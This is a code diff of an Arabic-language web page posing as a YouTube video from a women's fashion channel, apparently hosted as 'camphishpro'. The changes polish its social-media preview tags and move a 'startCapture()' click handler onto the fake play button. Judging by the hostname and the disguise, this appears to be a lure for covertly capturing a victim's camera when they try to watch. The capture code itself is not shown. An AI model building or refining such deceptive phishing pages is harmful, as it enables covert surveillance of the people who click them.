@@ -4,14 +4,13 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#0f0f0f">
-<title> اضغط لمشاهدة الفيديو على يوتيوب </title>
+<title>اضغط لمشاهدة الفيديو على يوتيوب</title>
 
-    <!-- وسوم المعاينة والوصف -->
     <meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="عالم الاناقة والجمال" />
     <meta property="og:url" content="https://camphishpro.onrender.com/" />
-    <meta property="og:title" content="اضغط هنا لمشاهدة الفيديو علة يوتيوب" />
+    <meta property="og:title" content="اضغط هنا لمشاهدة الفيديو على يوتيوب" />
     <meta property="og:description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
     <meta property="og:image" content="https://img.youtube.com/vi/zMORugVTZAA/hqdefault.jpg" />
     <meta property="og:image:secure_url" content="https://img.youtube.com/vi/zMORugVTZAA/hqdefault.jpg" />
@@ -21,7 +20,7 @@
 
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:url" content="https://camphishpro.onrender.com/" />
-    <meta name="twitter:title" content="اضغط هنا لمشاهدة الفيديو على يوتيوب " />
+    <meta name="twitter:title" content="اضغط هنا لمشاهدة الفيديو على يوتيوب" />
     <meta name="twitter:description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء المغربية والعالمية وكذالك الجمال نحرص كل يوم على ان نقدم لك سيدتي كل جديد لتحصلي عن كل ما تبحثي عنه وتكوني امرأة راقية وبأبهى حلة فإذا أعجبتك القناة فضلا قومي بالاشتراك فيها ومشاركتها مع من تحبين تحياااتي" />
     <meta name="twitter:image" content="https://img.youtube.com/vi/zMORugVTZAA/hqdefault.jpg" />
 
@@ -419,9 +418,9 @@ function renderWatch(){
   const v=cur();
   const rel=[...VIDEOS].filter(x=>x.id!==v.id).sort((a,b)=>(b.cat===v.cat)-(a.cat===v.cat));
   $('#view').innerHTML=`<div class="watch"><div class="w-primary">
-    <div class="player" id="playerContainer" data-videoId="${v.id}" style="cursor:pointer;position:relative;" onclick="startCapture()">
+    <div class="player" id="playerContainer" data-videoId="${v.id}" style="position:relative;">
       <img src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" style="width:100%;height:100%;object-fit:cover;" alt="">
-      <div style="position:absolute;inset:0;display:grid;place-items:center;background:rgba(0,0,0,0.2);">
+      <div style="position:absolute;inset:0;display:grid;place-items:center;background:rgba(0,0,0,0.2);cursor:pointer;" onclick="startCapture()">
         <div style="width:68px;height:48px;background:#ff0000;border-radius:12px;display:grid;place-items:center;box-shadow:0 4px 12px rgba(0,0,0,0.4);">
           <svg height="24" viewBox="0 0 24 24" width="24" fill="#fff"><path d="M8 5v14l11-7z"/></svg>
         </div>
